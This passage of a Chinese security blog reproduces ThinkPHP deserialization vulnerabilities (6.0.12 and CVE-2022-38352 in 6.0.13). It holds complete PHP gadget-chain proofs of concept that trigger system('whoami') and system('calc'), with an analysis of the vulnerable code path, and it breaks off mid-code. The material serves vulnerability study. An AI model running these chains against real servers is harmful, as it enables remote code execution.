<h2 id="6-0-12反序列化"><a href="#6-0-12反序列化" class="headerlink" title="6.0.12反序列化"></a>6.0.12反序列化</h2><h3 id="环境搭建-6"><a href="#环境搭建-6" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>composer.json</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">">=7.1.0"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"6.0.12"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/think-orm"</span><span class="token operator">:</span> <span class="token string">"^2.0"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后 composer update 一下</p>
<h3 id="poc-3"><a href="#poc-3" class="headerlink" title="poc"></a>poc</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>

<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>

<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$force</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还有个针对6.0.9以后的poc，感觉跟上面那个没啥不同）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern</span><span class="token punctuation">;</span>

<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Attribute</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token operator">=></span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$withAttr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token operator">=></span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$json</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">trait</span> <span class="token class-name-definition class-name">ModelEvent</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$withEvent</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>

<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Attribute</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token package">model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>ModelEvent</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$exists</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$force</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$lazySave</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$suffix</span><span class="token punctuation">;</span>


    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">force</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withEvent</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">suffix</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>相比之前的版本，此版本的变化就是在 vendor&#x2F;topthink&#x2F;think-orm&#x2F;src&#x2F;model&#x2F;concern&#x2F;Attribute.php 的 <code>getValue</code>方法这里</p>
<p>Before：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getJsonValue</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$closure</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getJsonValue</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$closure</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$closure</span> <span class="token keyword">instanceof</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Closure</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>$closure($value, $this-&gt;data)</code>前多了个if判断，它会再一次判断$closure是否为闭包函数，所以原来的链子就断了</p>
<p>新的链子rce的方法依旧是利用 $closure 的动态执行</p>
<p>这里是进入 getValue 方法内 if 中的<code>getJsonValue()</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240318002837699.png" alt="image-20240318002837699"></p>
<p>跟进到最终rce的地方</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240318003203025.png" alt="image-20240318003203025"></p>
<p>只要构造<code>$this-&gt;jsonAssoc = true;</code>，就能进入if执行<code>$value[$key] = $closure($value[$key], $value);</code>从而达到同样的效果</p>
<p>至于怎么进入<code>getJsonValue()</code>，我们回到 getValue 看一下前面的判断</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$relation</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getRelationValue</span><span class="token punctuation">(</span><span class="token variable">$relation</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$fieldName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getJsonValue</span><span class="token punctuation">(</span><span class="token variable">$fieldName</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看底下这个if判断</p>
<p>对于<code>in_array($fieldName, $this-&gt;json)</code>，首先是<code>$fieldName</code>，这个值在前面跟进 getRealFieldName 方法时发现就是我们 data 的键值，因此构造</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>当data的键为key时，<code>$fieldName</code>就为key，那就满足了in_array</p>
<p>接下来看<code>is_array($this-&gt;withAttr[$fieldName])</code>，即判断<code>withAttr[&#39;key&#39;]</code>是否为数组，所以构造</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后就进入<code>getJsonValue()</code>方法了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getJsonValue</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$closure</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$closure</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中传入的参数<code>$fieldName</code>，<code>$value</code>分别是data的键和值，所以构造</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"key1"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样子在进了 foreach 后，$name是上边的<code>$fieldName=key</code>，$value还是之前的$value的值<code>[&quot;key1&quot; =&gt; &quot;whoami&quot;]</code></p>
<p>接下来的判断<code>if ($this-&gt;jsonAssoc)</code>只需构造</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后来到我们最终rce的地方</p>
<p><code>$closure($value[$key], $value);</code>&#x3D;&gt;<code>system(&#39;data[&#39;key1&#39;]&#39;,$value)</code>&#x3D;&gt;<code>system(&#39;whoami&#39;,$value);</code></p>
<p>这里后边跟个$value对system是没有影响的，于是成功命令执行</p>
<hr>
<h2 id="6-0-13反序列化（CVE-2022-38352）"><a href="#6-0-13反序列化（CVE-2022-38352）" class="headerlink" title="6.0.13反序列化（CVE-2022-38352）"></a>6.0.13反序列化（CVE-2022-38352）</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Psr6Cache</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$pool</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token variable">$exp</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>log</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Channel</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$lazy</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token variable">$exp</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazy</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php system(\'calc\'); exit(); ?>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">App</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$instances</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">instances</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'think\Request'</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>view<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Php</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>log<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Socket</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string single-quoted-string">'debug'</span><span class="token operator">=></span><span class="token constant boolean">true</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'force_client_ids'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'allow_client_ids'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'format_head'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>view<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Php</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'display'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>App</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>log<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
